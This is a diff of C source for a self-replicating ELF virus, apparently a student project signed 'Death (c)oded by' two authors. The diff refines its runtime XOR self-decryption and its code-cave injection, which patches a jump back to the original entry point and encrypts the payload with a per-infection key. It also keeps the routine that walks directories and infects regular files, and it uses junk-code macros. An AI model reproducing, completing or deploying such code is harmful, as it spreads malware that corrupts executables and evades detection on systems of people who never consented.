@@ -22,10 +22,12 @@
 #endif
 
 #ifndef PATH2
- #define PATH2 "./tmp"
+ #define PATH2 "/tmp/test2"
 #endif
 
 #define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
+#define PAYLOAD_SIZE (uintptr_t)&end - (uintptr_t)&real_start
+#define PACKER_SIZE (uintptr_t)&real_start - (uintptr_t)&_start
 
 extern void end(void);
 
@@ -33,10 +35,13 @@ void	famine(bootstrap_data_t *bootstrap_data, uint16_t *counter);
 void	jmp_end(void);
 void	entrypoint(int argc, char **argv, char **envp);
 void	decrypt_self(void);
-void	dummy_start(void);
+void	real_start(void);
 void	_start(void);
 
 #define JMP_SIZE 4
+
+/* _start should be here cause we want it at 0x1000,
+ * also the linker should compile this file first */
 
 void __attribute__((naked)) _start(void)
 {
@@ -45,7 +50,13 @@ void __attribute__((naked)) _start(void)
 			"movq 8(%rsp), %rdi\n"
 			"leaq 16(%rsp), %rsi\n"
 			"leaq 8(%rsi,%rdi,8), %rdx\n"
+			"push %rdi\n"
+			"push %rsi\n"
+			"push %rdx\n"
 			"call decrypt_self\n"
+			"pop %rdx\n"
+			"pop %rsi\n"
+			"pop %rdi\n"
 			"call entrypoint\n"
 			"pop %rdx\n"
 			".global jmp_end\n"
@@ -54,7 +65,9 @@ void __attribute__((naked)) _start(void)
 	);
 }
 
-char __attribute__((section(".text#"))) g_signature[SIGNATURE_SIZE] = "Death (c)oded by [diroyer] & [eamar] - deadbeaf:0000\n\0";
+char __attribute__((section(".text#"))) g_signature[SIGNATURE_SIZE] = \
+	"Death (c)oded by [diroyer] & [eamar] - deadbeaf:0000\n\0";
+
 int64_t __attribute__((section(".text#"))) g_key = 0x0;
 int __attribute__((section(".text#"))) g_start_offset = 0x1000;
 
@@ -69,12 +82,12 @@ void decrypt_self(void)
 	if (g_key == 0x0) {
 		return;
 	}
-	uintptr_t dummy = (uintptr_t)&dummy_start;
-	xor_decrypt((void*)dummy, (uintptr_t)&end - (uintptr_t)&dummy_start, g_key);
+	uintptr_t dummy = (uintptr_t)&real_start;
+	xor_decrypt((void*)dummy, (uintptr_t)&end - (uintptr_t)&real_start, g_key);
 	return;
 }
 
-void __attribute__((naked)) dummy_start(void) {}
+void __attribute__((naked)) real_start(void) {}
 
 static int	patch_new_file(data_t *data, const char *filename) { JUNK;
 
@@ -99,69 +112,10 @@ static inline int64_t calc_jmp(uint64_t from, uint64_t to, uint64_t offset) {
 	return (int64_t)to - (int64_t)from - (int64_t)offset;
 }
 
-//static int packer(data_t *data) {
-//	data->packer.p_size = (size_t)&packer_end - (size_t)&packer_start; JUNK;
-//
-//	if (text(data, data->packer.p_size) != 0) {
-//		return 1;
-//	}
-//
-//	return 0;
-//}
-
 static void update_signature(data_t *data) {
 	ft_memset(&g_signature[SIGNATURE_SIZE - 6], '0', 4);
 	update_fingerprint(&g_signature[SIGNATURE_SIZE - 15], data);
 }
-//
-//static void init_patch(data_t *data, size_t jmp_rel_offset) {
-//
-//	patch_t *patch = &data->patch; JUNK;
-//
-//	/* calculate the difference between the cave and the packer 
-//	 * will always be positive cause .data is after the .text */
-//	uint32_t addr_diff = data->cave.addr - data->packer.addr;
-//
-//	patch->jmp = (int32_t)(addr_diff - jmp_rel_offset - sizeof(int32_t) - 1);
-//
-//	char signature[SIGNATURE_SIZE]; JUNK;
-//
-//	ft_strncpy(signature, sign, SIGNATURE_SIZE);
-//
-//	/* "Famine (c)oded by dxrxbxk - straboul:numb", 0x0a, 0 
-//	 * reset the hash (numb) to 0000 */
-//	ft_memset(&signature[SIGNATURE_SIZE - 6], '0', 4);
-//
-//	update_fingerprint(&signature[ft_strlen(signature) - 14], data);
-//
-//	ft_strncpy(patch->signature, signature, sizeof(patch->signature)); JUNK;
-//
-//	patch->decrypt_size = data->cave.p_size;
-//
-//	patch->virus_offset = addr_diff;
-//
-//	patch->key = gen_key_64();
-//
-//	g_key = patch->key;
-//}
-//
-//static int packer_patch(data_t *data) {
-//
-//	uint16_t jmp_rel_offset = (uintptr_t)&jmp_rel - (uintptr_t)&packer_start; JUNK;
-//
-//	init_patch(data, jmp_rel_offset);
-//
-//	uintptr_t pstart = (uintptr_t)&packer_start;
-//
-//	/* copy the packer */
-//	ft_memcpy(data->file + data->packer.offset, (void*)pstart, data->packer.p_size); JUNK;
-//
-//	/* patch the packer, jmp_rel offset is where the data of the packer is stored */
-//	ft_memcpy(data->file + data->packer.offset + jmp_rel_offset + 1, &data->patch, sizeof(patch_t));
-//
-//	return 0;
-//
-//}
 
 static int	inject(data_t *data) {
 
@@ -173,7 +127,7 @@ static int	inject(data_t *data) {
 
 	uint16_t jmp_offset		= (uintptr_t)&jmp_end - (uintptr_t)&_start + 1;
 	uintptr_t start			= (uintptr_t)&_start;
-	uint16_t dummy_offset	= (uintptr_t)&dummy_start - (uintptr_t)&_start;
+	uint16_t real_start_off = (uintptr_t)&real_start - (uintptr_t)&_start;
 	g_key					= gen_key_64();
 
 	data->cave.rel_jmp = (int32_t)calc_jmp(data->cave.addr, data->cave.old_entry, jmp_offset + JMP_SIZE);
@@ -182,9 +136,7 @@ static int	inject(data_t *data) {
 
 	ft_memcpy(data->file + data->cave.offset + jmp_offset, &data->cave.rel_jmp, JMP_SIZE); JUNK;
 
-	//encrypt(data->file + data->cave.offset, data->cave.p_size, data->patch.key);
-	//
-	encrypt(data->file + data->cave.offset + dummy_offset, data->cave.p_size - dummy_offset, g_key);
+	encrypt(data->file + data->cave.offset + real_start_off, data->cave.p_size - real_start_off, g_key);
 
 	return 0;
 }
@@ -299,6 +251,7 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 				continue;
 			
 			if (dir->d_type == DT_REG) {
+
 				char new_path[NAME_MAX]; JUNK;
 
 				char *ptr = new_path;
@@ -340,9 +293,7 @@ void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
 		STR(PATH1),
 		STR(PATH2),
 		NULL
-	};
-
-	JUNK;
+	}; JUNK;
 
 	for (int i = 0; paths[i]; ++i)
 		open_file(paths[i], bs_data, counter);
@@ -351,6 +302,7 @@ void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
 
 void	entrypoint(int argc, char **argv, char **envp)
 {
+
 	bootstrap_data_t bootstrap_data;
 	bootstrap_data.argc = argc;
 	bootstrap_data.argv = argv;
